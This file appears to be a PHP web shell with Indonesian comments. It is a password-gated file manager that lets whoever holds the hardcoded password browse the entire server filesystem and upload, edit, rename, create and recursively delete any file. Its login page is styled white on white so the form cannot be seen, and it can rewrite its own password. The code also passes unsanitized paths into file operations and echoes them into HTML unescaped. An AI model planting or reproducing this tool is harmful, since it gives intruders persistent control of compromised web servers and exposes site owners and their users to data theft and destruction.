<?php
session_start();

// Fungsi untuk membaca file PHP ini
function getScriptContent() {
    return file_get_contents(__FILE__);
}

// Fungsi untuk menyimpan konten baru ke file PHP ini
function saveScriptContent($content) {
    file_put_contents(__FILE__, $content);
}

// Password yang benar (ubah sesuai keinginan Anda)
$correct_password = "021553";

// Fungsi untuk mengecek apakah user sudah login
function isLoggedIn() {
    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
}

// Fungsi untuk menangani login
function handleLogin($password) {
    global $correct_password;
    if ($password === $correct_password) {
        $_SESSION['loggedin'] = true;
        return true;
    }
    return false;
}

// Fungsi untuk mengganti password
function changePassword($new_password) {
    global $correct_password;
    $script_content = getScriptContent();
    $new_script_content = preg_replace(
        '/(\$correct_password\s*=\s*\")[^\"]+(\")/',
        '$1' . addslashes($new_password) . '$2',
        $script_content
    );
    saveScriptContent($new_script_content);
    $_SESSION['correct_password'] = $new_password;
    $correct_password = $new_password;
}

// Fungsi untuk membuat folder
function createFolder($folder_name, $path) {
    $target_dir = rtrim($path, '/') . '/' . $folder_name;
    if (!is_dir($target_dir)) {
        return mkdir($target_dir);
    }
    return false;
}

// Fungsi untuk mengunggah file
function uploadFile($file, $path) {
    $target_file = rtrim($path, '/') . '/' . basename($file["name"]);
    return move_uploaded_file($file["tmp_name"], $target_file);
}

// Fungsi untuk menghapus file
function deleteFile($file_path) {
    if (is_file($file_path)) {
        return unlink($file_path);
    }
    return false;
}

// Fungsi untuk menghapus direktori beserta isinya
function deleteDir($dir_path) {
    if (!is_dir($dir_path)) {
        return false;
    }
    $items = array_diff(scandir($dir_path), ['.', '..']);
    foreach ($items as $item) {
        $full_path = "$dir_path/$item";
        is_dir($full_path) ? deleteDir($full_path) : unlink($full_path);
    }
    return rmdir($dir_path);
}

// Fungsi untuk membuat file baru
function createFile($file_name, $path) {
    $target_file = rtrim($path, '/') . '/' . $file_name;
    if (!file_exists($target_file)) {
        return touch($target_file);
    }
    return false;
}

// Menangani form login
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password']) && !isLoggedIn()) {
    if (handleLogin($_POST['password'])) {
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    } else {
        $login_error = "Password salah!";
    }
}

// Menangani form penggantian password
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_password']) && isLoggedIn()) {
    $new_password = $_POST['new_password'];
    changePassword($new_password);
    $password_change_success = "Password berhasil diganti!";
}

// Menangani form pembuatan folder
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_folder']) && isLoggedIn()) {
    $folder_name = $_POST['folder_name'];
    $current_path = $_POST['current_path'];
    if (createFolder($folder_name, $current_path)) {
        $folder_create_success = "Folder berhasil dibuat.";
    } else {
        $folder_create_error = "Gagal membuat folder.";
    }
}

// Menangani form pengunggahan file
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit']) && isLoggedIn()) {
    $current_path = $_POST['current_path'];
    if (uploadFile($_FILES["file"], $current_path)) {
        $file_upload_success = "File berhasil diunggah.";
    } else {
        $file_upload_error = "Gagal mengunggah file.";
    }
}

// Menangani penghapusan file atau direktori setelah form di-submit
if (isset($_GET['delete']) && isLoggedIn()) {
    $path_to_delete = $_GET['delete'];
    if (is_dir($path_to_delete)) {
        if (deleteDir($path_to_delete)) {
            $delete_success = "Direktori berhasil dihapus.";
        } else {
            $delete_error = "Gagal menghapus direktori.";
        }
    } else {
        if (deleteFile($path_to_delete)) {
            $delete_success = "File berhasil dihapus.";
        } else {
            $delete_error = "Gagal menghapus file.";
        }
    }
}

// Menangani pembuatan file baru setelah form di-submit
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['create_file']) && isLoggedIn()) {
    $file_name = $_POST['file_name'];
    $current_path = $_POST['current_path'];
    if (createFile($file_name, $current_path)) {
        $file_create_success = "File berhasil dibuat.";
    } else {
        $file_create_error = "Gagal membuat file.";
    }
}

// Menangani penggantian nama file atau direktori setelah form di-submit
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['new_name']) && isset($_POST['old_name']) && isLoggedIn()) {
    $old_name = $_POST['old_name'];
    $new_name = $_POST['new_name'];
    if (rename($old_name, dirname($old_name) . '/' . $new_name)) {
        $rename_success = "Berhasil mengubah nama.";
    } else {
        $rename_error = "Gagal mengubah nama.";
    }
}

// Menangani pengeditan file setelah form di-submit
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['file_content']) && isset($_POST['file_to_edit']) && isLoggedIn()) {
    $file_to_edit = $_POST['file_to_edit'];
    $new_content = $_POST['file_content'];
    if (file_put_contents($file_to_edit, $new_content) !== false) {
        $file_edit_success = "Berhasil menyimpan perubahan.";
    } else {
        $file_edit_error = "Gagal menyimpan perubahan.";
    }
}

// Menampilkan form login jika user belum login
if (!isLoggedIn()) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Login</title>
        <style>
            body {
                background-color: #FFFFFF;
                color: #FFFFFF;
                font-family: 'Courier New', Courier, monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .login-box {
                background-color: #FFFFFF;
                padding: 20px;
                border: 1px solid #FFFFFF;
                border-radius: 8px;
                box-shadow: 0 0 10px #FFFFFF;
            }
            input[type="password"], input[type="submit"] {
                display: block;
                width: 100%;
                padding: 10px;
                margin: 10px 0;
                background-color: #FFFFFF;
                border: 1px solid #FFFFFF;
                color: #FFFFFF;
                font-family: 'Courier New', Courier, monospace;
            }
            input[type="submit"] {
                cursor: pointer;
            }
        </style>
    </head>
    <body>
        <div class="login-box">
        <h2>Login</h2>
        <?php if (isset($login_error)): ?>
            <p><?php echo htmlspecialchars($login_error); ?></p>
        <?php endif; ?>
        <form method="post" action="">
            <input type="password" name="password" placeholder="Enter Password" required>
            <input type="submit" value="Login">
        </form>
        </div>
    </body>
    </html>
    <?php
    exit();
}

// Menampilkan form untuk mengganti password jika parameter URL 'change_password' ada
if (isset($_GET['change_password']) && isLoggedIn()) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Change Password</title>
    </head>
    <body>
        <h2>Change Password</h2>
        <?php if (isset($password_change_success)): ?>
            <p><?php echo htmlspecialchars($password_change_success); ?></p>
        <?php elseif (isset($password_change_error)): ?>
            <p><?php echo htmlspecialchars($password_change_error); ?></p>
        <?php endif; ?>
        <form method="post" action="">
            <input type="password" name="new_password" placeholder="Enter New Password" required>
            <input type="submit" value="Change Password">
        </form>
    </body>
    </html>
    <?php
    exit();
}

// Menampilkan form untuk mengubah nama file atau direktori
if (isset($_GET['rename']) && isLoggedIn()) {
    $old_name = $_GET['rename'];
    $is_directory = is_dir($old_name);
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Rename <?php echo $is_directory ? 'Directory' : 'File'; ?></title>
    </head>
    <body>
        <h2>Rename <?php echo $is_directory ? 'Directory' : 'File'; ?></h2>
        <form method="post" action="">
            <input type="text" name="new_name" placeholder="Enter New Name" required>
            <input type="hidden" name="old_name" value="<?php echo htmlspecialchars($old_name); ?>">
            <input type="submit" value="Rename">
        </form>
    </body>
    </html>
    <?php
    exit();
}

// Menampilkan form untuk mengedit file
if (isset($_GET['edit_file']) && isLoggedIn()) {
    $file_to_edit = $_GET['edit_file'];
    if (is_file($file_to_edit)) {
        $file_content = file_get_contents($file_to_edit);
        ?>
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <title>Edit File</title>
        </head>
        <body>
            <h2>Edit File</h2>
            <form method="post" action="">
                <textarea name="file_content" rows="20" cols="100"><?php echo htmlspecialchars($file_content); ?></textarea>
                <input type="hidden" name="file_to_edit" value="<?php echo htmlspecialchars($file_to_edit); ?>">
                <input type="submit" value="Save Changes">
            </form>
        </body>
        </html>
        <?php
        exit();
    }
}

// Menampilkan form untuk membuat folder
if (isset($_GET['create_folder']) && isLoggedIn()) {
    $current_path = $_GET['path'] ?? getcwd();
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Create Folder</title>
    </head>
    <body>
        <h2>Create Folder</h2>
        <form method="post" action="">
            <input type="text" name="folder_name" placeholder="Folder Name" required>
            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
            <input type="submit" name="create_folder" value="Create Folder">
        </form>
    </body>
    </html>
    <?php
    exit();
}

// Menampilkan form untuk mengunggah file
if (isset($_GET['upload_file']) && isLoggedIn()) {
    $current_path = $_GET['path'] ?? getcwd();
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Upload File</title>
    </head>
    <body>
        <h2>Upload File</h2>
        <form method="post" enctype="multipart/form-data" action="">
            <input type="file" name="file" required>
            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
            <input type="submit" name="submit" value="Upload">
        </form>
    </body>
    </html>
    <?php
    exit();
}

// Menampilkan form untuk membuat file baru
if (isset($_GET['create_file']) && isLoggedIn()) {
    $current_path = $_GET['path'] ?? getcwd();
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <title>Create File</title>
    </head>
    <body>
        <h2>Create File</h2>
        <form method="post" action="">
            <input type="text" name="file_name" placeholder="File Name" required>
            <input type="hidden" name="current_path" value="<?php echo htmlspecialchars($current_path); ?>">
            <input type="submit" name="create_file" value="Create File">
        </form>
    </body>
    </html>
    <?php
    exit();
}

// Menampilkan konten utama jika user sudah login
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
chdir($path);

// Memecah path menjadi bagian-bagian
$paths = explode(DIRECTORY_SEPARATOR, realpath($path));

// Menampilkan tautan logout dan ganti password
echo "<a href='?logout'>Logout</a> | ";
echo "<a href='?change_password'><button>Ganti Password</button></a> | ";
echo "<a href='?create_folder&path=$path'><button>Create Folder</button></a> | ";
echo "<a href='?create_file&path=$path'><button>Create File</button></a> | ";
echo "<a href='?upload_file&path=$path'><button>Upload File</button></a>";
echo "<hr>";

// Menampilkan jalur direktori saat ini
echo "<h2>Current Path:</h2>";
echo "<p>";
foreach ($paths as $i => $p) {
    if ($i > 0) {
        echo "/";
    }
    echo "<a href='" . $_SERVER['PHP_SELF'] . "?path=";
    for ($j = 0; $j <= $i; $j++) {
        if ($j > 0) {
            echo "/";
        }
        echo $paths[$j];
    }
    echo "'>$p</a>";
}
echo "</p>";

// Menampilkan konten direktori saat ini
echo "<h2>Directory Listing:</h2>";
$items = scandir(getcwd());

echo "<ul>";
foreach ($items as $item) {
    if ($item === "." || $item === "..") {
        continue;
    }
    $full_path = realpath($item);
    if (is_dir($full_path)) {
        echo "<li>[DIR] <a href='" . $_SERVER['PHP_SELF'] . "?path=$full_path'>$item</a></li>";
        echo " <a href='" . $_SERVER['PHP_SELF'] . "?rename=$full_path'>Rename</a>";
        echo " <a href='" . $_SERVER['PHP_SELF'] . "?delete=$full_path'>Delete</a>";
    } else {
        echo "<li>[FILE] <a href='" . $_SERVER['PHP_SELF'] . "?edit_file=$full_path'>$item</a></li>";
        echo " <a href='" . $_SERVER['PHP_SELF'] . "?rename=$full_path'>Rename</a>";
        echo " <a href='" . $_SERVER['PHP_SELF'] . "?delete=$full_path'>Delete</a>";
    }
}
echo "</ul>";

// Menampilkan hasil operasi
function displayOperationResult($success, $error) {
    if ($success) {
        echo "<p>$success</p>";
    }
    if ($error) {
        echo "<p>$error</p>";
    }
}

displayOperationResult($rename_success ?? null, $rename_error ?? null);
displayOperationResult($file_edit_success ?? null, $file_edit_error ?? null);
displayOperationResult($delete_success ?? null, $delete_error ?? null);
displayOperationResult($file_create_success ?? null, $file_create_error ?? null);
displayOperationResult($folder_create_success ?? null, $folder_create_error ?? null);
displayOperationResult($file_upload_success ?? null, $file_upload_error ?? null);
?>
